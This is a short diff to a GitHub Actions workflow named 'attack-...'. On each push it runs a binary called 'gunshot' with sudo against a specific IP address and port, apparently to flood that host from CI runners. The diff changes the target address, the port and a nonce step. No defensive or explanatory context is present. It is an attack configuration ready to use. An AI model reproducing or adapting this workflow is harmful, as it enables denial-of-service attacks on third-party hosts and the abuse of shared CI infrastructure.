@@ -1,4 +1,4 @@
-name: attack-4a257aca
+name: attack-82c7735f
 on:
   push:
     branches: [ main, master ]
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x gunshot
     - name: Fire
-      run: sudo ./gunshot 91.108.17.25 32002 60 200
+      run: sudo ./gunshot 91.108.17.55 32001 60 200
       continue-on-error: true
-    - name: Nonce 4a257aca
-      run: echo "nonce=4a257aca"
+    - name: Nonce 82c7735f
+      run: echo "nonce=82c7735f"
